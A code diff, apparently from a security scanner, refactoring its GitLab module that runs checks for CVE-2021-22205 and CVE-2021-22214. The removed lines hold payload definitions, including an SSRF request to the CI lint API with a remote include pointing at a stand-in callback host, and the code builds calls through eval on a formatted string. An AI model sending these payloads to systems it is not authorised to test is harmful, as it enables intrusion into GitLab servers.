@@ -20,7 +20,6 @@ file:///C:/Windows/System32/drivers/etc/hosts
 '''
 
 from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
 from lib.tool.thread import thread
 from thirdparty import requests
 from payloads.Gitlab.cve_2021_22205 import cve_2021_22205_scan
@@ -28,49 +27,20 @@ from payloads.Gitlab.cve_2021_22214 import cve_2021_22214_scan
 
 class Gitlab():
     def __init__(self):
+        self.app_name = 'Gitlab'
         self.session = requests.session()
-        
-        self.timeout = config.get('timeout')
+
         self.headers = config.get('headers')
+        self.timeout = config.get('timeout')
         self.proxies = config.get('proxies')
 
-        self.app_name = 'Gitlab'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
-
-        self.cve_2021_22205_payloads = [
-            {
-                'path': 'users/sign_in',
-                'data': ''
-            },
-            {
-                'path': 'uploads/user',
-                'data': ''
-            },
-            {
-                'path': 'sign_in',
-                'data': ''
-            },
-            {
-                'path': 'user',
-                'data': ''
-            }
-        ]
-        
-        self.cve_2021_22214_payloads = [
-            {
-                'path': 'api/v4/ci/lint',
-                'data': '{ "include_merged_yaml": true, "content": "include:\\n  remote: http://DNSdomain/api/v1/targets/?test.yml"}'
-            },
-        ]
-
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2021_22205_scan, url=url),
-            thread(target=self.cve_2021_22214_scan, url=url)
+            thread(target=self.cve_2021_22205_scan, clients=clients),
+            thread(target=self.cve_2021_22214_scan, clients=clients)
         ]
 
 Gitlab.cve_2021_22205_scan = cve_2021_22205_scan
